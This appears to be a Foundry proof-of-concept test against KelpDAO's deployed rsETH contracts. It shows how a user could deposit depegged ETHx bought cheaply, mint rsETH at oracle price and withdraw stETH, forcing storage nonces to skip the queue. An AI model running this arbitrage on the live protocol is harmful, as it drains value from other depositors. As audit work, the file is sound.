// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {Test,console2} from "forge-std/Test.sol";
import {ILRTCONFIG} from "./interfaces/ILRTCONFIG.sol";
import {ILRTDepositPool} from "./interfaces/ILRTDepositPool.sol";
import {ILRTWithdrawalManager} from "./interfaces/ILRTWithdrawalManager.sol";
import {IERC20} from "./interfaces/IERC20.sol";

contract DepegTest is Test {

    address RSETH = 0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7;
    address STETH_PROXY = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84; // deal: fail to write value
    address STETH = 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb; // deal: slot not found
    address ETHX = 0xA35b1B31Ce002FBF2058D22F30f95D405200A15b;
    address SFRXETH = 0xac3E018457B222d93114458476f3E3416Abbe38F;

    address LRT_MANAGER = 0x53a390000D1f1C4E880d74e702884E57147eC696;
    address STETH_NODE_DELEGATOR = 0x79f17234746344E0365D40be50d8d43DB9082c32;
    address STETH_STRATEGY = 0x93c4b944D05dfe6df7645A86cd2206016c51564D;

    ILRTCONFIG _lrtConfig = ILRTCONFIG(0x349A73444b1a310BAe67ef67973022020d70020d);
    ILRTDepositPool _lrtDepositPool = ILRTDepositPool(0x036676389e48133B63a802f8635AD39E752D375D);
    ILRTWithdrawalManager _lrtWithdrawalManager = ILRTWithdrawalManager(0x62De59c08eB5dAE4b7E6F7a8cAd3006d6965ec16);

    IERC20 _ethx = IERC20(ETHX);
    IERC20 _rseth = IERC20(RSETH);
    IERC20 _steth = IERC20(STETH_PROXY);

    function test_feeds() public view {
        uint256 stETH_price = _lrtConfig.getAssetPrice(STETH_PROXY);
        uint256 ETHx_price = _lrtConfig.getAssetPrice(ETHX);
        uint256 sfrxETH_price = _lrtConfig.getAssetPrice(SFRXETH);
        console2.log("stETH:",stETH_price);
        console2.log("ETHx:",ETHx_price);
        console2.log("sfrxETH:",sfrxETH_price);
    }

    function test_withdraw_another_lsd() public {
        address alice = makeAddr("alice");
        vm.startPrank(alice);

        // acquire 100 ETHx for 1 ETH on secondary market
        deal(address(ETHX), alice, 100 ether);

        // check how many rsETH we can get for 100 ETHx
        uint256 rsETH_amount_to_receive = _lrtDepositPool.getRsETHAmountToMint(address(ETHX), 100 ether);
        //console2.log("\nrsETH to get for 100 ETHx = ", rsETH_amount_to_receive / 1e18);

        // deposit 100 ETHx for 100 rsETH in KelpDAO
        _ethx.approve(address(_lrtDepositPool), 100 ether);
        console2.log("before deposit (ETHx=%d, rsETH=%d, stETH=%d)", _ethx.balanceOf(address(alice)) / 1e18,
            _rseth.balanceOf(address(alice)) / 1e18, _steth.balanceOf(address(alice)) / 1e18);
        _lrtDepositPool.depositAsset(address(ETHX), 100 ether, rsETH_amount_to_receive, "42");
        console2.log("after deposit (ETHx=%d, rsETH=%d, stETH=%d)", _ethx.balanceOf(address(alice)) / 1e18,
            _rseth.balanceOf(address(alice)) / 1e18, _steth.balanceOf(address(alice)) / 1e18);

        // request withdrawal of stETH by burning rsETH
        _rseth.approve(address(_lrtWithdrawalManager), rsETH_amount_to_receive);
        _lrtWithdrawalManager.initiateWithdrawal(address(STETH_PROXY), _rseth.balanceOf(address(alice)));
        console2.log("after withdrawal request (ETHx=%d, rsETH=%d, stETH=%d)", _ethx.balanceOf(address(alice)) / 1e18,
            _rseth.balanceOf(address(alice)) / 1e18, _steth.balanceOf(address(alice)) / 1e18);

        // update nextLockedNonce[asset] to unblock withdrawal
        bytes32 nextUnusedNonceSlot = keccak256(abi.encode(address(STETH_PROXY), uint256(153)));
        bytes32 nextLockedNonceSlot = keccak256(abi.encode(address(STETH_PROXY), uint256(154)));
        vm.store(address(_lrtWithdrawalManager), nextLockedNonceSlot, bytes32(vm.load(address(_lrtWithdrawalManager), nextUnusedNonceSlot)));
        vm.roll(30000000); // withdrawalDelayBlocks is 7 days, so go way into the future

        // complete withdrawal
        _lrtWithdrawalManager.completeWithdrawal(address(STETH_PROXY));
        console2.log("after withdrawal completed (ETHx=%d, rsETH=%d, stETH=%d)", _ethx.balanceOf(address(alice)) / 1e18,
            _rseth.balanceOf(address(alice)) / 1e18, _steth.balanceOf(address(alice)) / 1e18);
    }
}